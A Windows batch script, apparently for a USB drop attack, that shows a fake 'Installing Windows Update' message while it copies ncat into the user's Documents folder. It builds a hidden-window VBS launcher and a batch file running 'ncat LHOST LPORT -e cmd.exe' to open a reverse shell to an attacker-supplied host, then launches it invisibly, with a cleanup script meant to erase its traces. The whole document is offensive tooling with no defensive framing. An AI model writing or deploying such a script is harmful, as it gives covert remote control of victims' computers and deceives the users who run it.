@echo off

::Initial Setup

echo Installing Windows Update...
set LDRIVE=%~d0
set TARGETDIR=%USERPROFILE%\Documents
set ncatDIR=%LDRIVE%\Tools\

if Exist %TARGETDIR% (
mkdir %TARGETDIR%\temp
xcopy %ncatDIR%\ncat.exe %TARGETDIR%\temp >nul
)

::Invis.vbs Build

set var= CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
ECHO %var% > %TARGETDIR%\temp\invis.vbs

:: rShell Build

echo ^@echo off > %TARGETDIR%\temp\rShell.bat
set /p LHOST = "Set LHOST:"
set /p LPORT = "Set LPORT:"
echo ^%USERPROFILE^%\Documents\temp\ncat %LHOST% %LPORT% -e cmd.exe >> %TARGETDIR%\temp\rShell.bat

:: nKill Build

echo ^@echo off > %TARGETDIR%\nKill.bat
echo echo Installing Windows Update... >> %TARGETDIR%\nKill.bat
echo timeout /t 7 ^>nul >> %TARGETDIR%\nKill.bat
echo RD /S /Q ^%USERPROFILE^%\Documents\temp
echo start cmd.exe /c timeout /t 7 ^& del /Q ^%USERPROFILE^%\Documents\nKill.bat ^& taskkill /IM cmd.exe

:: Initiation

wscript.exe %USERPROFILE%\Documents\temp\invis.vbs %USERPROFILE%\Documents\temp\rShell.bat

